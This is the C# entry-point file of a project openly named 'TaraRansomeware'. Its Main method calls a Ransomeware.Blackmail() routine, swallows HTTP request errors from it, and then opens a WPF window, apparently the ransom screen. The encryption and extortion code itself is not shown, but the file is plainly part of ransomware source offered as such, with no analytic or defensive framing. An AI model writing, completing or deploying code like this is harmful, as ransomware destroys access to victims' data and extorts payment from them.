using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace TaraRansomeware
{
    internal static class Program
    {
        private const string Kernel32_DllName = "kernel32.dll";

        [DllImport(Kernel32_DllName)]
        private static extern bool AllocConsole();

        [DllImport(Kernel32_DllName)]
        private static extern bool FreeConsole();

        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        private static void Main(string[] args)
        {
#if DEBUG
            AllocConsole();
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
            Debug.AutoFlush = true;
            Debug.WriteLine("Hello, TaraRansomeware");
#endif

            try
            {
                Ransomeware.Blackmail();
            }
            catch (AggregateException aggregateException)
            {
                aggregateException.Handle((x) =>
                {
                    if (x is HttpRequestException)
                    {
                        Debug.WriteLine(x.Message);
                    }
                    return false;
                });
            }

            TaraRansomeware.App app = new TaraRansomeware.App();
            app.InitializeComponent();
            app.MainWindow = new MainWindow();
            app.Run();

#if DEBUG
            FreeConsole();
#endif
        }
    }
}